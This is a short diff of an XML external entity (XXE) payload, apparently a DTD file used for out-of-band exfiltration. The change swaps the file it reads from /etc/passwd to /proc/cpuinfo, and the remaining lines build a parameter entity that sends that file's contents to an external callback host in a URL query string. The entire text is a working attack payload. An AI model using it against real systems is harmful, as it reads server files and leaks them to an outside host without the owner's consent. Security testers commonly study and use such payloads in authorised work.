@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///proc/cpuinfo">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://cb5u04vpvtatp7ssl8e01rruc8t9sysb8.oast.pro?x=%file;'>">
 %eval;
 %exfiltrate;
